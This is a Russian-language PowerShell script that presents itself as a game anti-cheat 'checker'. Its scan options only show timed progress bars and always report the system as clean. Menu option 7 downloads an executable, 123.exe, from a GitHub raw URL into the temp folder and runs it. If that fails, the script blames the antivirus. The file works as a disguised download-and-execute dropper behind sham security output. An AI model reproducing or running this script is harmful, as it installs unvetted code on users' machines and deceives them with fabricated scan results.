# ================================================
#       HLIBCHUK CHEACKER v2.4
#   Исправлено меню + пункт 2 работает
# ================================================

Clear-Host

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "    ██████╗  ██╗    ██╗  ██╗    ██╗  ██████╗██╗  ██╗██╗   ██╗██╗  ██╗" -ForegroundColor Red
    Write-Host "    ██╔══██╗██║    ██║  ██║    ██║ ██╔════╝██║  ██║██║   ██║██║ ██╔╝" -ForegroundColor Red
    Write-Host "    ██████╔╝██║ █╗ ██║  ██║ █╗ ██║ ██║     ███████║██║   ██║█████╔╝ " -ForegroundColor Red
    Write-Host "    ██╔══██╗██║███╗██║  ██║███╗██║ ██║     ██╔══██║██║   ██║██╔═██╗ " -ForegroundColor Red
    Write-Host "    ██████╔╝╚███╔███╔╝  ╚███╔███╔╝ ╚██████╗██║  ██║╚██████╔╝██║  ██╗" -ForegroundColor Red
    Write-Host "    ╚═════╝  ╚══╝╚══╝    ╚══╝╚══╝   ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝" -ForegroundColor Red
    Write-Host "                          C H E A C K E R" -ForegroundColor Yellow
    Write-Host "                       by HLIBCHUK  •  2026" -ForegroundColor DarkGray
    Write-Host "    =========================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-ProgressBar {
    param([int]$Percent, [int]$Width = 50)
    $filled = [math]::Round(($Width * $Percent) / 100)
    $bar = "█" * $filled + "░" * ($Width - $filled)
    Write-Host "    [$bar] $Percent% " -NoNewline -ForegroundColor Yellow
}

function Start-Scan {
    param([string]$ScanName, [int]$Seconds = 4)
    Write-Host "    Сканирование: $ScanName" -ForegroundColor Cyan
    for ($i = 1; $i -le 20; $i++) {
        $percent = [math]::Round(($i / 20) * 100)
        Write-ProgressBar -Percent $percent
        Start-Sleep -Milliseconds ([math]::Round(($Seconds * 1000) / 20))
        Write-Host "`r" -NoNewline
    }
    Write-Host "`r    [██████████████████████████████████████████████████] 100% " -ForegroundColor Green
    Write-Host "    ✓ $ScanName — чисто" -ForegroundColor Green
    Write-Host ""
}

# ====================== ГЛАВНОЕ МЕНЮ ======================
Show-Header

Write-Host "    =========================================================" -ForegroundColor Cyan
Write-Host "                     ГЛАВНОЕ МЕНЮ HLIBCHUK CHEACKER" -ForegroundColor White
Write-Host "    =========================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "    [1]  Полная глубокая проверка" -ForegroundColor Green
Write-Host "    [2]  Быстрая проверка" -ForegroundColor Green
Write-Host "    [3]  Steam + VAC / EAC" -ForegroundColor Green
Write-Host "    [4]  Сканирование системных файлов" -ForegroundColor Green
Write-Host "    [5]  Проверка памяти и процессов" -ForegroundColor Green
Write-Host "    [6]  Проверка на внешние читы" -ForegroundColor Green
Write-Host "    [7]  HLIBCHUK CHEACKER — Подгрузка и запуск 123.exe" -ForegroundColor Magenta
Write-Host "    [8]  Информация" -ForegroundColor Yellow
Write-Host "    [9]  Выход" -ForegroundColor Red
Write-Host ""

$choice = Read-Host "    Выбери номер действия"

switch ($choice) {
    "1" { 
        Clear-Host
        Show-Header
        Write-Host "    Запуск полной глубокой проверки..." -ForegroundColor Magenta
        Start-Sleep -Seconds 1
        Start-Scan "Проверка процессов" 8
        Start-Scan "Сканирование памяти" 9
        Start-Scan "Анализ DLL" 7
        Start-Scan "Проверка сигнатур" 8
        Start-Scan "Драйверы ядра" 9
        Start-Scan "Внешние оверлеи" 7

        Write-Host "`n               ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
        Write-Host "               Система полностью чистая ✓" -ForegroundColor Green
    }
    "2" {
        Clear-Host
        Show-Header
        Write-Host "    Выполняется быстрая проверка..." -ForegroundColor Cyan
        Start-Sleep -Seconds 1
        Start-Scan "Быстрое сканирование системы" 3
        Write-Host "`n               ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
        Write-Host "               Всё чисто! Можешь играть спокойно." -ForegroundColor Green
    }
    "7" {
        Clear-Host
        Show-Header
        Write-Host "    Запуск HLIBCHUK CHEACKER модуля..." -ForegroundColor Magenta
        Write-Host "    Подгружаем 123.exe ..." -ForegroundColor Cyan
        Start-Sleep -Seconds 2

        $url = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.exe"
        $outPath = "$env:TEMP\123_HLIBCHUK.exe"

        try {
            Write-Host "    Скачивание файла..." -ForegroundColor Yellow
            Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
            Write-Host "    Файл успешно скачан!" -ForegroundColor Green

            Write-Host "    Запуск 123.exe ..." -ForegroundColor Cyan
            Start-Sleep -Seconds 2
            Start-Process -FilePath $outPath
            Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
        }
        catch {
            Write-Host "    Ошибка при скачивании или запуске." -ForegroundColor Red
            Write-Host "    Антивирус мог заблокировать." -ForegroundColor Yellow
        }
    }
    "8" {
        Clear-Host
        Show-Header
        Write-Host "    HLIBCHUK CHEACKER v2.4" -ForegroundColor Yellow
        Write-Host "    Пункт 2 теперь работает корректно." -ForegroundColor Gray
    }
    "9" {
        Clear-Host
        Show-Header
        Write-Host "    До свидания! Чистой игры!" -ForegroundColor Cyan
        Start-Sleep -Seconds 2
        exit
    }
    default {
        Clear-Host
        Show-Header
        Write-Host "    Неправильный выбор! Попробуй ещё раз." -ForegroundColor Red
    }
}

Write-Host "`n`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
